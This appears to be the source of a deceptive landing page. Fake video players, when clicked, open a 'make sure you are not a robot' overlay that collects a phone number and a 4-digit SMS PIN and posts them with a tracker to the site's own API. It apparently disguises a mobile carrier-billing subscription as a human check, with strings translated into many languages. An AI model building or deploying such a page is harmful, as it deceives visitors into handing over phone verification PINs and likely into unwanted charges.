                successMessage: "កូដផ្ទៀងផ្ទាត់ត្រូវបានផ្ញើដោយជោគជ័យ!",
                loading: "សំណើរបស់អ្នកកំពុងត្រូវបានដំណើរការ...",
                msisdn_placeholder: "លេខទូរស័ព្ទ (0123-4567890)",
                pin_placeholder: "បញ្ចូល PIN 4 ខ្ទង់",
                sendPinBtn: "ផ្ញើ PIN",
                verifyBtn: "ផ្ទៀងផ្ទាត់ PIN"
            },
            lo: {
                container: "ໃຫ້ແນ່ໃຈວ່າທ່ານບໍ່ແມ່ນຫຸ່ນຍົນ.",
                errorMessage: "ເກີດຂໍ້ຜິດພາດ. ກະລຸນາລອງອີກຄັ້ງ.",
                successMessage: "ສົ່ງລະຫັດຢືນຢັນສຳເລັດແລ້ວ!",
                loading: "ກຳລັງດຳເນີນການຂໍ້ຮ້ອງຂອງທ່ານ...",
                msisdn_placeholder: "ເບີໂທລະສັບ (0123-4567890)",
                pin_placeholder: "ໃສ່ PIN 4 ຕົວເລກ",
                sendPinBtn: "ສົ່ງ PIN",
                verifyBtn: "ຢືນຢັນ PIN"
            },
            si: {
                container: "ඔබ රොබෝවෙක් නොවන බවට වග බලා ගන්න.",
                errorMessage: "දෝෂයක් ඇති විය. කරුණාකර නැවත උත්සාහ කරන්න.",
                successMessage: " සත්‍යාපන කේතය සාර්ථකව යවා ඇත!",
                loading: "ඔබගේ ඉල්ලීම සැකසෙමින් පවතී...",
                msisdn_placeholder: "දුරකථන අංකය (0123-4567890)",
                pin_placeholder: "ඉලක්කම් 4 ක PIN ඇතුළත් කරන්න",
                sendPinBtn: "PIN යවන්න",
                verifyBtn: "PIN සත්‍යාපනය කරන්න"
            },
            as: {
                container: "নিশ্চিত কৰক যে আপুনি ৰবট নহয়।",
                errorMessage: "এটা ত্ৰুটি হৈছে। অনুগ্ৰহ কৰি আকৌ চেষ্টা কৰক।",
                successMessage: "যাচনি কৰা কোড সফলভাৱে পঠিওৱা হ'ল!",
                loading: "আপোনাৰ অনুৰোধ প্ৰক্ৰিয়া কৰি থকা হৈছে...",
                msisdn_placeholder: "ফোন নম্বৰ (0123-4567890)",
                pin_placeholder: "4 অংকৰ পিন সুমুৱাওক",
                sendPinBtn: "পিন পঠিয়াওক",
                verifyBtn: "পিন যাচনি কৰক"
            },
            or: {
                container: "ନିଶ୍ଚିତ କରନ୍ତୁ ଆପଣ ରୋବୋଟ୍ ନୁହଁନ୍ତି।",
                errorMessage: "ଏକ ତ୍ରୁଟି ଘଟିଛି। ଦୟାକରି ପୁନର୍ବାର ଚେଷ୍ଟା କରନ୍ତୁ।",
                successMessage: "ଯାଞ୍ଚ କୋଡ୍ ସଫଳତାର ସହିତ ପଠାଯାଇଛି!",
                loading: "ଆପଣଙ୍କର ଅନୁରୋଧ ପ୍ରକ୍ରିୟାକରଣ ହେଉଛି...",
                msisdn_placeholder: "ଫୋନ୍ ନମ୍ବର (0123-4567890)",
                pin_placeholder: "4 ଅଙ୍କର PIN ପ୍ରବେଶ କରନ୍ତୁ",
                sendPinBtn: "PIN ପଠାନ୍ତୁ",
                verifyBtn: "PIN ଯାଞ୍ଚ କରନ୍ତୁ"
            },
            ps: {
                container: "ډاډه اوسئ چې تاسې روبوت نه یاست.",
                errorMessage: "یوه تېروتنه راغله. مهرباني وکړئ بیا هڅه وکړئ.",
                successMessage: "د تایید کوډ په بریالیتوب سره لیږل شوی!",
                loading: "ستاسو غوښتنه پروسس کیږي...",
                msisdn_placeholder: "د تلیفون شمیره (0123-4567890)",
                pin_placeholder: "4 رقمي PIN دننه کړئ",
                sendPinBtn: "PIN ولېږئ",
                verifyBtn: "PIN تایید کړئ"
            },
            ku: {
                container: "Pê ewle bin ku hûn robot nînin.",
                errorMessage: "Çewtiyek çêbû. Ji kerema xwe dîsa hewl bidin.",
                successMessage: "Koda pejirandinê bi serkeftî hate şandin!",
                loading: "Daxwaza we tê pêvajokirin...",
                msisdn_placeholder: "Hejmara telefonê (0123-4567890)",
                pin_placeholder: "PIN-ya 4-reqamî têkevin",
                sendPinBtn: "PIN bişînin",
                verifyBtn: "PIN pejirînin"
            },
            ti: {
                container: "ሮቦት ከዘይኮይንካ ኣረጋግጽ።",
                errorMessage: "ጌጋ ተፈጢሩ ኣሎ። በጃኹም መሊስ ፈትኑ።",
                successMessage: "ናይ ምርግጋጽ ኮድ ብዓወት ተለኪዑ ኣሎ!",
                loading: "ሕቶኹም እዩ እዚ እዋን እዚ እዩ እዚ...",
                msisdn_placeholder: "ቁጽሪ ስልኪ (0123-4567890)",
                pin_placeholder: "4 ኣሃዝ PIN ኣእትዉ",
                sendPinBtn: "PIN ለኣኽ",
                verifyBtn: "PIN ኣረጋግጽ"
            },
            mg: {
                container: "Ataovy matetika fa tsy robot ianao.",
                errorMessage: "Nisy hadisoana nitranga. Andramo indray azafady.",
                successMessage: "Ny kaody fanamarinana dia nalefa soa aman-tsara!",
                loading: "Ny fangatahanao dia ampiasaina...",
                msisdn_placeholder: "Laharana finday (0123-4567890)",
                pin_placeholder: "Ampidiro ny PIN misy laharana 4",
                sendPinBtn: "Alefaso ny PIN",
                verifyBtn: "Hamarinho ny PIN"
            },
            ny: {
                container: "Onetsetsani kuti simu robot.",
                errorMessage: "Palive cholakwika. Chonde yesani kachiwiri.",
                successMessage: "Kodi yotsimikizira yatumizidwa bwino!",
                loading: "Pempho lanu likugwira ntchito...",
                msisdn_placeholder: "Nambala yafoni (0123-4567890)",
                pin_placeholder: "Lowetsani PIN ya ma digit 4",
                sendPinBtn: "Tumizani PIN",
                verifyBtn: "Tsimikizirani PIN"
            },
            bh: {
                container: "यकीन करीं कि आप रोबोट नाहीं।",
                errorMessage: "एगो त्रुटि भइल। कृपया फिर से कोसिस करीं।",
                successMessage: "पुष्टिकरण कोड सफलता से भेजल गइल!",
                loading: "आपके अनुरोध के प्रसंस्करण हो रहल बा...",
                msisdn_placeholder: "फोन नंबर (0123-4567890)",
                pin_placeholder: "4 अंकन पिन डालीं",
                sendPinBtn: "पिन भेजीं",
                verifyBtn: "पिन पुष्टि करीं"
            },
            mai: {
                container: "यकीन करू कि अहाँ रोबोट नहीं।",
                errorMessage: "एगो त्रुटि भेल। कृपया फेर कोसिस करू।",
                successMessage: "पुष्टिकरण कोड सफलता से भेजल गेल!",
                loading: "अहाँक अनुरोध प्रसंस्करण हो रहल बा...",
                msisdn_placeholder: "फोन नंबर (0123-4567890)",
                pin_placeholder: "4 अंकक पिन डालू",
                sendPinBtn: "पिन भेजू",
                verifyBtn: "पिन पुष्टि करू"
            },
            mn: {
                container: "Та робот биш эсэхээ шалгаарай.",
                errorMessage: "Алдаа гарлаа. Дахин оролдоно уу.",
                successMessage: "Баталгаажуулах код амжилттай илгээгдлээ!",
                loading: "Таны хүсэлтийг боловсруулж байна...",
                msisdn_placeholder: "Утасны дугаар (0123-4567890)",
                pin_placeholder: "4 оронтой PIN оруулна уу",
                sendPinBtn: "PIN илгээх",
                verifyBtn: "PIN баталгаажуулах"
            },
            so: {
                container: "Hubi inaadan ahayn robot.",
                errorMessage: "Khalad ayaa dhacay. Fadlan isku day mar kale.",
                successMessage: "Koodhka xaqiijinta si guul leh ayaa loo diray!",
                loading: "Codsigaaga waa la wada shaqeynayaa...",
                msisdn_placeholder: "Lambarka taleefanka (0123-4567890)",
                pin_placeholder: "Geli PIN 4 xaraf",
                sendPinBtn: "U dir PIN",
                verifyBtn: "Xaqiiji PIN"
            },
            ig: {
                container: "Jide n'aka na ị bụghị robot.",
                errorMessage: "Enwere mperi. Biko nwaa ọzọ.",
                successMessage: "Ezipụla koodu nkwenye nke ọma!",
                loading: "A na-ahazi arịrịọ gị...",
                msisdn_placeholder: "Nọmba ekwentị (0123-4567890)",
                pin_placeholder: "Tinye PIN 4 dijitị",
                sendPinBtn: "Ziga PIN",
                verifyBtn: "Nyochaa PIN"
            },
            ff: {
                container: "Seedu a wona robot.",
                errorMessage: "Juumre waɗi. Tiiɗno etaa-ɗaa.",
                successMessage: "Koode seedantinɗe nden neldaani no moƴƴi!",
                loading: "Ɗaɓɓital maa ena waɗa...",
                msisdn_placeholder: "Limgal cellal (0123-4567890)",
                pin_placeholder: "Naatu PIN 4 ccfere",
                sendPinBtn: "Neldu PIN",
                verifyBtn: "Seedu PIN"
            },
            wo: {
                container: "Mana neen dëgg-dëgg du yaw robot.",
                errorMessage: "Am na njumte. Maangol dellu.",
                successMessage: "Koodu wone bi ñeel na!",
                loading: "Soxna sa dafay yombal...",
                msisdn_placeholder: "Limu telefone (0123-4567890)",
                pin_placeholder: "Diggale PIN 4 xarnu",
                sendPinBtn: "Yónnee PIN",
                verifyBtn: "Wone PIN"
            },
            bo: {
                container: "ཁྱེད་རང་རོབོཊ་མིན་པར་ངེས་པ་ཡག་པོ་བྱེད་རོགས།",
                errorMessage: "ནོར་འཁྲུལ་ཞིག་བྱུང་ཡོད། ཡང་བསྐྱར་ཚོད་ལྟ་བྱེད་རོགས།",
                successMessage: "ཁྲོལ་ཆ་གྲུབ་སྣང་ངེས་པར་དུ་བཏང་ཡོད།!",
                loading: "ཁྱེད་ཀྱི་ཞུ་འདུན་ལས་དོན་གྱིས་བསྒྲུབ་བཞིན་པ་རེད།...",
                msisdn_placeholder: "ཁ་པར་གནས་ཚད། (0123-4567890)",
                pin_placeholder: "ཨང་ཀི ༤ ཅན་གྱི་PIN ཞུགས་རོགས།",
                sendPinBtn: "PIN གཏོང་རོགས།",
                verifyBtn: "PIN ངེས་པ་ཡག་པོ་བྱེད་རོགས།"
            },
            sm: {
                container: "Ia mautinoa e te le o se robot.",
                errorMessage: "Ua tupu se mea sese. Faamolemole toe taumafai.",
                successMessage: "Ua lafo ma le manuia le code faamaonia!",
                loading: "O loʻo faʻagasolo lau talosaga...",
                msisdn_placeholder: "Numera telefoni (0123-4567890)",
                pin_placeholder: "Ulufale PIN 4-numera",
                sendPinBtn: "Lafo PIN",
                verifyBtn: "Faamaonia PIN"
            }
          
        };

        function replace_text(lang, text) {
      x = document.getElementById(text);
      if (x) {
        x.innerHTML = translation[lang][text];
      } else {
        console.log("element not Found: " + text);
      }
    }

    function alert_string(lang, text) {
      return translation[lang][text] + "\n\n";
    }

    function translation_available(lang) {
      if (translation[lang]) {
        return lang;
      } else {
        console.log("translation not Found: " + lang);
        return "source";
      }
    }

    function detect_language() {
      var language = navigator.language || navigator.userLanguage;
      if (language.length > 4) {
        language = language[0] + language[1];
      };
      if (jQuery.inArray(language, ['ar', 'he', 'fa', 'ur']) >= 0) {
        $('.wrapper').attr('DIR', 'RTL');
        $('.top_wrapper').css('text-align', 'right');
        $('.button').css('padding', '0 20px 18px 20px')
      }
      return translation_available(language);
    }

    function translate() {
      var language = detect_language();
      for (y in translation["source"]) {
        replace_text(language, y);
        if (y == 'aler') {
          strAlert += translation[language][y];
        }
      }

    }

    function getURLParameter(name) {
      return decodeURI(
        (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
      );
    }
    </script>
    
</head>
<body onload="translate();">
    
    <div class="mask hidden" id="mask">
    </div>       

    <div class="container" >
        
        <div class="container-pin hidden"  id="container">
              
            <h3>Make sure that you are not a robot.</h3>             
            <br>

            <!-- 隐藏的 发送错误 信息 -->
            <div class="error-message" id="errorMessage" style="display: none;">
            An error has occurred. Please try again.
            </div>                
            <!-- 隐藏的 发送成功 信息 -->
            <div class="success-message" id="successMessage" style="display: none;">
            Verification code has been successfully sent!
            </div>               
            <!-- 隐藏的 loading -->
            <div class="loading" id="loading">
                <div class="loading-spinner"></div>
                <p>Your request is being processed...</p>
            </div>
            

            <form id="phoneForm">
                <!-- 1、手机号码输入框 -->
                <div class="form-group">                        
                    <div class="phone-input">
                        <span class="country-code">+88</span>
                        <input class="blink" type="text" name="msisdn" id="msisdn" placeholder="Phone number (0123-4567890)" required 
                               pattern="[0-9]{4} [0-9]{7}" title="0123-4567890">
                    </div>                       
                </div>
                <!-- 2、验证码输入框 + 发送验证码按钮 -->
                <div class="form-group">                   
                    <div class="pin-input-container-pin">
                        <input type="text" name="pin" id="pin" class="pin-input blink" placeholder="Enter 4-digit PIN" 
                               pattern="[0-9]{4}" title="4-digit PIN" maxlength="4" disabled>
                        <button type="submit" class="send-pin-btn" id="sendPinBtn">Send PIN</button>
                    </div>                       
                </div>             
            </form>
            

            <!-- 3、确认验证码按钮 -->
            <button type="click" class="btn" id="verifyBtn" disabled>Verify PIN</button>
        </div>
        
        <!-- 发送验证码及确认验证码JS -->
        <script> 
            // 点击‘发送验证码’按钮流程
            document.getElementById('phoneForm').addEventListener('submit', async function(e) {
                e.preventDefault();
                
                const input = document.getElementById('msisdn');
                const errorDiv = document.getElementById('errorMessage');
                const successDiv = document.getElementById('successMessage');
                const loadingDiv = document.getElementById('loading');
                const pinInput = document.getElementById('pin');
                const sendPinBtn = document.getElementById('sendPinBtn');
                const verifyBtn = document.getElementById('verifyBtn');
                
                // 隐藏 previous messages
                errorDiv.style.display = 'none';
                successDiv.style.display = 'none';
                
                // 简单的客户端验证
                if (!input.value.match(/^\d{4} \d{7}$/)) {
                    errorDiv.textContent = 'Please fill out in the following format: 0123-4567890';
                    errorDiv.style.display = 'block';
                    return;
                }
                
                // 显示加载指示器
                loadingDiv.style.display = 'block';
                input.classList.remove('blink');
                try {
                    // 发送数据到服务器端处理
                    const formData = new FormData();
                    formData.append('msisdn', input.value);
                    
                    const response = await fetch('/api/api_handler.php', {
                        method: 'POST',
                        body: formData
                    });
                    
                    const result = await response.json();
                    
                    if (result.status === 'success') {
                        successDiv.textContent = 'Verification code has been successfully sent!';
                        successDiv.style.display = 'block';
                        errorDiv.style.display = 'none';
                        
                        // 启用PIN输入和verify按钮
                        
                        pin.disabled = false;
                        verifyBtn.disabled = false;
                        
                        // 保存tracker（如果有）
                        if (result.tracker) {
                            window.tracker = result.tracker;
                        }
                        // 禁用按钮并开始倒计时
                        sendPinBtn.disabled = true;
                        let countdown = 120; // 120秒倒计时
                        
                        // 更新按钮文本
                        sendPinBtn.textContent = ` ${countdown}s`;
                        
                        // 设置倒计时间隔
                        const countdownInterval = setInterval(() => {
                            countdown--;
                            sendPinBtn.textContent = ` ${countdown}s`;
                            
                            if (countdown <= 0) {
                                clearInterval(countdownInterval);
                                sendPinBtn.disabled = false;
                                sendPinBtn.textContent = 'Send PIN';
                            }
                        }, 1000);
                        
                        
                    } 
                    else {
                        // 显示错误消息
                        errorDiv.style.display = 'block';
                    }
                }
                catch (error) {
                    // 处理网络错误
                    errorDiv.style.display = 'block';
                    console.error('Error:', error);
                } 
                finally {
                    // 无论成功或失败，都隐藏加载指示器
                    loadingDiv.style.display = 'none';
                }
            });
            
            // 格式化电话号码输入
            document.getElementById('msisdn').addEventListener('input', function(e) {
                // 移除所有非数字字符
                let value = e.target.value.replace(/\D/g, '');
                
                // 如果超过11位，截取前11位
                if (value.length > 11) {
                    value = value.substring(0, 11);
                }
                
                // 根据数字长度进行格式化
                let formattedValue = value;
                if (value.length > 4) {
                    formattedValue = value.substring(0, 4) + ' ' + value.substring(4, 11) ;
                }
                
                // 更新输入框的值
                e.target.value = formattedValue;
            });
                      
            // 验证PIN码按钮功能
            document.getElementById('verifyBtn').addEventListener('click', async function() {
                const pinInput = document.getElementById('pin');
                const errorDiv = document.getElementById('errorMessage');
                const successDiv = document.getElementById('successMessage');
                const loadingDiv = document.getElementById('loading');
                const containerDiv = document.getElementById('container');
                const maskDiv = document.getElementById('mask');
                const fourplayerDiv = document.getElementById('fourplayer');
               
                // 验证PIN码
                if (!pinInput.value.match(/^\d{4}$/)) {
                    errorDiv.style.display = 'block';
                    
                    return;
                }
                
                // 显示加载指示器
                loadingDiv.style.display = 'block';
                errorDiv.style.display = 'none';
                successDiv.style.display = 'none';
                pinInput.classList.remove('blink');
                try {
                    // 发送验证请求
                    const formData = new FormData();
                    formData.append('pin', pinInput.value);
                    formData.append('tracker', window.tracker || '');
                    
                    const response = await fetch('/api/verify.php', {
                        method: 'POST',
                        body: formData
                    });
                    
                    const result = await response.json();
                    // 如果返回success,重新给successDiv的textContent赋值
                    if (result.status === 'success') {
                        successDiv.textContent = 'Verification successful!';
                        successDiv.style.display = 'block';
                        
                        // 如果服务器返回了重定向地址，设置一个2秒的延时，然后重定向用户到相应的页面。
                        if (result.redirect) {
                            setTimeout(() => {
                                window.location.href = result.redirect;
                            }, 2000);
                        }
                        // 没重定向将整个div隐藏，显示出下面的播放按钮，方便点击跳转
                        else{
                            setTimeout(() => {
                                containerDiv.classList.add('hidden');
                                maskDiv.classList.add('hidden');
                            }, 1000);   
                        }
                        fourplayerDiv.removeEventListener('click', ShowContainer);
                        fourplayerDiv.addEventListener('click', launchpopLink);
                    } 
                    else {
                        errorDiv.textContent = 'Invalid verification code. Please try again.';
                        errorDiv.style.display = 'block';
                    }
                } catch (error) {
                    errorDiv.textContent = 'The verification code is incorrect. Please check your PIN and try again.';
                    errorDiv.style.display = 'block';
                    console.error('Error:', error);
                } finally {
                    loadingDiv.style.display = 'none';
                }
            });
        </script>
       
        
    </div>

    

    

    <div onclick="ShowContainer()" id="fourplayer">
        <!-- 第一行播放器 -->
        <div class="player-row">
            <div class="player-container">
                <div class="player bg1">
                    <div class="controls">
                        <button class="button" >▶</button>
                        <div class="progress">
                            <div class="progress-filled"></div>
                        </div>
                        <div class="time">0:00 / 39:46</div>
                        <button class="button" >🔊</button>
                        <button class="button" >⛶</button>
                    </div>
                    <div class="player_content">
                        <img class="player_content loading2" src="/public/images/loading2.svg" alt="">
                        
                        <img class="player_content play" src="/public/images/play.svg" alt="" >
                    </div>
                </div>
            </div>
        </div>
        
        <!-- 第二行播放器 -->
        <div class="player-row">
            <div class="player-container">
                <div class="player bg2">
                    <div class="controls">
                        <button class="button">▶</button>
                        <div class="progress">
                            <div class="progress-filled"></div>
                        </div>
                        <div class="time">0:00 / 21:36</div>
                        <button class="button" >🔊</button>
                        <button class="button" >⛶</button>
                    </div>
                    <div class="player_content">
                        <img class="player_content loading2" src="/public/images/loading2.svg" alt="">
                        
                        <img class="player_content play" src="/public/images/play.svg" alt="" >
                    </div>
                </div>
            </div>
        </div>
        
        <!-- 第三行播放器 -->
        <div class="player-row">
            <div class="player-container">
                <div class="player bg3">
                    <div class="controls">
                        <button class="button" >▶</button>
                        <div class="progress">
                            <div class="progress-filled"></div>
                        </div>
                        <div class="time">0:00 / 35:21</div>
                        <button class="button" >🔊</button>
                        <button class="button" >⛶</button>
                    </div>
                    <div class="player_content">
                        <img class="player_content loading2" src="/public/images/loading2.svg" alt="">
                        
                        <img class="player_content play" src="/public/images/play.svg" alt="" >
                    </div>
                </div>
            </div>
        </div>
        
        <!-- 第四行播放器 -->
        <div class="player-row">
            <div class="player-row" >
            <div class="player-container">
                <div class="player bg4">
                    <div class="controls">
                        <button class="button">▶</button>
                        <div class="progress">
                            <div class="progress-filled"></div>
                        </div>
                        <div class="time">0:00 / 36:25</div>
                        <button class="button">🔊</button>
                        <button class="button">⛶</button>
                    </div>
                    <div  class="player_content">
                        <img class="player_content loading2" src="/public/images/loading2.svg" alt="">
                        
                        <img class="player_content play" src="/public/images/play.svg" alt="" >
                    </div>
                </div>
            </div>
        </div>
    </div>
    <script>
        function ShowContainer() {
            const containerDiv = document.getElementById('container');
            const maskDiv = document.getElementById('mask');

            containerDiv.classList.remove('hidden');
            maskDiv.classList.remove('hidden');

        }
    </script>  
</body>
</html>